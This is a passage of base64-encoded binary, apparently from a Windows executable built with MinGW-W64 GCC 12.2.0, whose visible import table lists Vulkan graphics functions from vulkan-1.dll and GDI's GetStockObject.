VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAABcQAAAA8AQAFxAAAJoQAAAI8AQAmhAAAPYQAAAU8AQA9hAAACURAAAg8AQAJREAAFQRAABE8AQAVBEAAH8UAABo8AQAfxQAAIMVAAB08AQAgxUAAIoWAACA8AQAihYAALkWAACM8AQAwBYAAMEWAACY8AQA0BYAANMWAA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UIUgQDAVAAAAEIAwUIUgQDAVAAAAELBDULAwZiAjABUAEIAwUIcgQDAVAAAAEIAwUIkgQDAVAAAAEIAwUIUgQDAVAAAAEIAwUIEgQDAVAAAAEIAwUIEgQDAVAAAAEPBzUPAwpSBjAFYARwA8ABUAAAAQ8HNQ8DClIGMAVgBHADwAFQAAABCAMFCDIEAwFQAAABCAMFCDIEAwFQAAABCAMFCDIEAwFQAAABCAMFCJIEAwFQAAABCAMFCDIEAwFQAAABBAIFBAMBUAELBFULAwaiAjABUAELBGULAwbCAjABUAELBCULAwZCAjABUAERBYURAwkBEQACMAFQAAABCwRVCwMGogIwAVABCwRVCwMGogIwAVABEQhlEQMMwggwB2AGcAXAA9ABUAEIAwUIUgQDAVAAAAEIAwUIcgQDAVAAAAEIAwUIUgQDAVAAAAEIAwUIkgQDAVAAAAELBFULAwaiAjABUAELBFULAwaiAjABUAELBFULAwaiAjABUAERBYURAwkBEQACMAFQAAABCwR1CwMG4gIwAVABCAMFCLIEAwFQAAABCwQFCwEaAAQDAVABCAMFCFIEAwFQAAABCAMFCFIEAwFQAAABCAMFCFIEAwFQAAABCAMFCNIEAwFQAAABBAIFBAMBUAELBFULAwaiAjABUAEQBIUQAwgBIAABUAEIAwUIEgQDAVAAAAEIAwUIMgQDAVAAAAEIAwUIcgQDAVAAAAEIAwUIcgQDAVAAAAEIAwUIcgQDAVAAAAEIAwUIMgQDAVAAAAEIAwUIEgQDAVAAAAEEAgUEAwFQAQgDBQhSBAMBUAAAAQgDBQgyBAMBUAAAAQgDBQiSBAMBUAAAAQgDBQhSBAMBUAAAAQsEBQsBEgAEAwFQAQgDBQhyBAMBUAAAAQgDBQiyBAMBUAAAAQgDBQhSBAMBUAAAAQgDBQjSBAMBUAAAAQgDBQiSBAMBUAAAAQsEVQsDBqICMAFQAQQCBQQDAVABCAMFCBIEAwFQAAABBAIFBAMBUAEIAwUIcgQDAVAAAAEIAwUIEgQDAVAAAAEIAwUIEgQDAVAAAAEIAwUIcgQDAVAAAAEIAwUIkgQDAVAAAAEIAwUIUgQDAVAAAAERBYURAwkBNQACMAFQAAABCAMFCLIEAwFQAAABCAMFCBIEAwFQAAABCwQ1CwMGYgIwAVABCAMFCBIEAwFQAA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ljYWxEZXZpY2VQcm9wZXJ0aWVzAAAAAACrAHZrR2V0UGh5c2ljYWxEZXZpY2VRdWV1ZUZhbWlseVByb3BlcnRpZXMAAKYAdmtHZXRQaHlzaWNhbERldmljZU1lbW9yeVByb3BlcnRpZXMAAACYAHZrR2V0SW5zdGFuY2VQcm9jQWRkcgAAAAAARAB2a0NyZWF0ZURldmljZQAAAABgAHZrRGVzdHJveURldmljZQAAAHYAdmtFbnVtZXJhdGVJbnN0YW5jZUV4dGVuc2lvblByb3BlcnRpZXMAAAAAdAB2a0VudW1lcmF0ZURldmljZUV4dGVuc2lvblByb3BlcnRpZXMAAHcAdmtFbnVtZXJhdGVJbnN0YW5jZUxheWVyUHJvcGVydGllcwAAAACKAHZrR2V0RGV2aWNlUXVldWUAAMAAdmtRdWV1ZVN1Ym1pdAAAAAAAcgB2a0RldmljZVdhaXRJZGxlAAAEAHZrQWxsb2NhdGVNZW1vcnkAAH4AdmtGcmVlTWVtb3J5AAC8AHZrTWFwTWVtb3J5AAAAywB2a1VubWFwTWVtb3J5AAAAAAAGAHZrQmluZEJ1ZmZlck1lbW9yeQAAAAAIAHZrQmluZEltYWdlTWVtb3J5AAAAAACAAHZrR2V0QnVmZmVyTWVtb3J5UmVxdWlyZW1lbnRzAAAAAACTAHZrR2V0SW1hZ2VNZW1vcnlSZXF1aXJlbWVudHMAAEgAdmtDcmVhdGVGZW5jZQAAAAAAYgB2a0Rlc3Ryb3lGZW5jZQAAAADGAHZrUmVzZXRGZW5jZXMAAAAAAM4AdmtXYWl0Rm9yRmVuY2VzAAAAVQB2a0NyZWF0ZVNlbWFwaG9yZQAAAAAAbgB2a0Rlc3Ryb3lTZW1hcGhvcmUAAAAAPQB2a0NyZWF0ZUJ1ZmZlcgAAAABaAHZrRGVzdHJveUJ1ZmZlcgAAAEsAdmtDcmVhdGVJbWFnZQAAAAAAZAB2a0Rlc3Ryb3lJbWFnZQAAAACXAHZrR2V0SW1hZ2VTdWJyZXNvdXJjZUxheW91dAAAAEwAdmtDcmVhdGVJbWFnZVZpZXcAAAAAAGUAdmtEZXN0cm95SW1hZ2VWaWV3AAAAAFYAdmtDcmVhdGVTaGFkZXJNb2R1bGUAAG8AdmtEZXN0cm95U2hhZGVyTW9kdWxlAAAAAABOAHZrQ3JlYXRlUGlwZWxpbmVDYWNoZQAAAAAAaAB2a0Rlc3Ryb3lQaXBlbGluZUNhY2hlAAAAAEoAdmtDcmVhdGVHcmFwaGljc1BpcGVsaW5lcwAAAAAAZwB2a0Rlc3Ryb3lQaXBlbGluZQAAAAAATwB2a0NyZWF0ZVBpcGVsaW5lTGF5b3V0AAAAAGkAdmtEZXN0cm95UGlwZWxpbmVMYXlvdXQAAABTAHZrQ3JlYXRlU2FtcGxlcgAAAGwAdmtEZXN0cm95U2FtcGxlcgAAQgB2a0NyZWF0ZURlc2NyaXB0b3JTZXRMYXlvdXQAAABeAHZrRGVzdHJveURlc2NyaXB0b3JTZXRMYXlvdXQAAEEAdmtDcmVhdGVEZXNjcmlwdG9yUG9vbAAAAABdAHZrRGVzdHJveURlc2NyaXB0b3JQb29sAAAAAwB2a0FsbG9jYXRlRGVzY3JpcHRvclNldHMAAM0AdmtVcGRhdGVEZXNjcmlwdG9yU2V0cwAAAABJAHZrQ3JlYXRlRnJhbWVidWZmZXIAAABjAHZrRGVzdHJveUZyYW1lYnVmZmVyAABRAHZrQ3JlYXRlUmVuZGVyUGFzcwAAAABrAHZrRGVzdHJveVJlbmRlclBhc3MAAAA/AHZrQ3JlYXRlQ29tbWFuZFBvb2wAAABcAHZrRGVzdHJveUNvbW1hbmRQb29sAAACAHZrQWxsb2NhdGVDb21tYW5kQnVmZmVycwAAfAB2a0ZyZWVDb21tYW5kQnVmZmVycwAABQB2a0JlZ2luQ29tbWFuZEJ1ZmZlcgAAcwB2a0VuZENvbW1hbmRCdWZmZXIAAAAADwB2a0NtZEJpbmRQaXBlbGluZQAAAAAAOQB2a0NtZFNldFZpZXdwb3J0AAA1AHZrQ21kU2V0U2Npc3NvcgAAAA0AdmtDbWRCaW5kRGVzY3JpcHRvclNldHMAAAAdAHZrQ21kRHJhdwAAAAAAFgB2a0NtZENvcHlCdWZmZXJUb0ltYWdlAAAAACoAdmtDbWRQaXBlbGluZUJhcnJpZXIAAAsAdmtDbWRCZWdpblJlbmRlclBhc3MAACQAdmtDbWRFbmRSZW5kZXJQYXNzAAAAAHAAdmtEZXN0cm95U3VyZmFjZUtIUgAAAFkAdmtDcmVhdGVXaW4zMlN1cmZhY2VLSFIAAADAAkdldFN0b2NrT2JqZWN